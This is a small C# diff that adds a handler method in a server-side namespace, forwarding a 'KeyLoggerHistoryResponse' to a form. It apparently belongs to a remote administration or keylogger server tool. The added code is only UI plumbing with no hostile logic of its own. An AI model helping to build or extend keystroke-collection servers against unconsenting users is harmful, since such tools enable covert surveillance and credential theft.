@@ -29,6 +29,11 @@ namespace Server.Handlers
         {
             _form.AppendContinuousBatch(batch);
         }
+
+        public void OnHistoryResponse(KeyLoggerHistoryResponse response)
+        {
+            _form.ApplyHistoryResponse(response);
+        }
     }
 }
 
